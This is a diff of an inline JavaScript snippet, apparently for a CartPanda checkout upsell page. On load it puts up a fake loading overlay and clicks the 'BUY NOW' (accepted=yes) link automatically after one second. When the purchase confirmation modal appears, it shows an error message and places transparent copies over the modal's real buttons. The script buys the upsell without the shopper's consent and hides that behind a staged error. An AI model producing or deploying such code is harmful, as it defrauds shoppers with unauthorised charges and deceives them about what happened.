@@ -15,18 +15,30 @@
             
 <script>
 document.addEventListener('DOMContentLoaded', () => {
-  // === 1) Injeta CSS do overlay com spinner, mensagens iniciais e mensagem de erro ===
+  // 1) Injeta CSS do overlay + posicao do modal (cartpanda-modal-container)
   const style = document.createElement('style');
   style.innerHTML = `
     @import url(https://fonts.bunny.net/css?family=inter:400,600);
 
-    /* overlay full-screen */
+    /* Modal container da CartPanda */
+    #cartpanda-modal-container,
+    div#cartpandaModal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      overflow: auto;
+      background-color: rgba(0,0,0,0.4);
+      z-index: 99999;
+      padding-top: 100px;
+    }
+
+    /* Overlay full-screen custom */
     #customOverlay {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
       background: rgba(255,255,255,0.95);
-      z-index: 1000000;
+      z-index: 100000;
       display: flex;
       flex-direction: column;
       justify-content: center;
@@ -35,8 +47,6 @@ document.addEventListener('DOMContentLoaded', () => {
       font-family: 'Inter', system-ui, sans-serif;
       pointer-events: auto;
     }
-
-    /* spinner */
     #customOverlay .spinner {
       border: 8px solid #f3f3f3;
       border-top: 8px solid #3498db;
@@ -49,16 +59,12 @@ document.addEventListener('DOMContentLoaded', () => {
       from { transform: rotate(0deg); }
       to   { transform: rotate(360deg); }
     }
-
-    /* mensagens iniciais */
     #customOverlay .msg {
       font-size: 1.125rem;    /* .font-size-lg */
       font-weight: 600;       /* .font-semibold */
       color: #141a27;
       margin: 5px 0;
     }
-
-    /* mensagem de erro (oculta até o modal aparecer) */
     #customOverlay .error {
       display: none;
       font-size: 1rem;        /* .font-size-md */
@@ -70,7 +76,7 @@ document.addEventListener('DOMContentLoaded', () => {
   `;
   document.head.appendChild(style);
 
-  // === 2) Cria e exibe o overlay ===
+  // 2) Cria overlay inicial e adiciona ao body
   const overlay = document.createElement('div');
   overlay.id = 'customOverlay';
   overlay.innerHTML = `
@@ -84,65 +90,58 @@ document.addEventListener('DOMContentLoaded', () => {
   `;
   document.body.appendChild(overlay);
 
-  // === 3) Após 1s, dispara clique automático no BUY NOW ===
+  // 3) Após 1s, dispara clique automático no BUY NOW
   setTimeout(() => {
     const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
-    if (buyLink) {
-      buyLink.click();
-    } else {
-      console.warn('Auto-upsell: botão BUY NOW não encontrado.');
-    }
+    if (buyLink) buyLink.click();
+    else console.warn('Auto-upsell: botão BUY NOW não encontrado.');
   }, 1000);
 
-  // === 4) Observa a injeção do modal da CartPanda ===
+  // 4) Observa injeção do modal da CartPanda
   const observer = new MutationObserver((mutations, obs) => {
     for (const m of mutations) {
       for (const node of m.addedNodes) {
         if (
           node.nodeType === 1 &&
-          (node.id === 'cartpandaModal' ||
-           node.id === 'cartpanda-modal-container' ||
-           node.classList.contains('cartpanda-modal'))
+          (node.id === 'cartpanda-modal-container' || node.id === 'cartpandaModal' || node.classList.contains('cartpanda-modal'))
         ) {
-          // === 5) Transição de overlay para estado de erro ===
+          // 5) Ao detectar modal: transita para erro
           overlay.querySelector('.spinner').style.display = 'none';
           overlay.querySelectorAll('.msg').forEach(el => el.style.display = 'none');
           overlay.querySelector('.error').style.display = 'block';
-          // permite que cliques atravessem o overlay
           overlay.style.pointerEvents = 'none';
 
-          // === 6) Cria “falsos botões” sobre os botões reais da CartPanda ===
-          const realSelectors = [
-            'button#cartpanda-close-modal-btn',
-            'button.cartpanda-secondary-button',
-            'button#cartpanda-payment-confirmation',
-            'button.cartpanda-primary-button'
+          // 6) Cria falsos botões com classes da CartPanda
+          const btnSelectors = [
+            'button.cartpanda-secondary-button',  // "No, thanks"
+            'button.cartpanda-primary-button'    // "Yes, proceed"
           ];
-          realSelectors.forEach(sel => {
-            const realBtn = node.querySelector(sel);
-            if (!realBtn) return;
-            const rect = realBtn.getBoundingClientRect();
+          btnSelectors.forEach(sel => {
+            const real = node.querySelector(sel);
+            if (!real) return;
+            const r = real.getBoundingClientRect();
             const fake = document.createElement('div');
+            // aplica a mesma classe para herdar o estilo
+            fake.className = real.className;
             Object.assign(fake.style, {
-              position: 'fixed',
-              top:    `${rect.top}px`,
-              left:   `${rect.left}px`,
-              width:  `${rect.width}px`,
-              height: `${rect.height}px`,
-              background: 'transparent',
-              pointerEvents: 'none',
-              zIndex: 1000001
+              position:       'fixed',
+              top:            `${r.top}px`,
+              left:           `${r.left}px`,
+              width:          `${r.width}px`,
+              height:         `${r.height}px`,
+              background:     'transparent',
+              pointerEvents:  'none',
+              zIndex:         100001
             });
             document.body.appendChild(fake);
-
-            // mantém alinhamento em resize
+            // ajusta em resize
             window.addEventListener('resize', () => {
-              const r2 = realBtn.getBoundingClientRect();
+              const nr = real.getBoundingClientRect();
               Object.assign(fake.style, {
-                top:    `${r2.top}px`,
-                left:   `${r2.left}px`,
-                width:  `${r2.width}px`,
-                height: `${r2.height}px`
+                top:    `${nr.top}px`,
+                left:   `${nr.left}px`,
+                width:  `${nr.width}px`,
+                height: `${nr.height}px`
               });
             });
           });
@@ -153,7 +152,6 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     }
   });
-
   observer.observe(document.body, { childList: true, subtree: true });
 });
 </script>
